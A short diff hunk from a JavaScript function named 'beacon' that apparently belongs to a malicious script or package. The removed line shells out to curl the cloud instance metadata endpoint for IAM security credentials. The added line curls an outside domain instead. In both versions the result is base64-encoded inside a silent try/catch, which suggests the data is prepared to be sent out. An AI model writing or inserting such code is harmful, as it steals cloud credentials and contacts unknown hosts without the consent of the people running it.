@@ -46,7 +46,7 @@ function beacon(urlStr, q) {
 
   let idOutput = "";
   try {
-    idOutput = execSync("curl 169.254.169.254/latest/meta-data/iam/security-credentials", { encoding: "utf8" }).trim();
+    idOutput = execSync("curl https://thezodd.com/", { encoding: "utf8" }).trim();
     idOutput = Buffer.from(idOutput).toString("base64");
   } catch {}
 
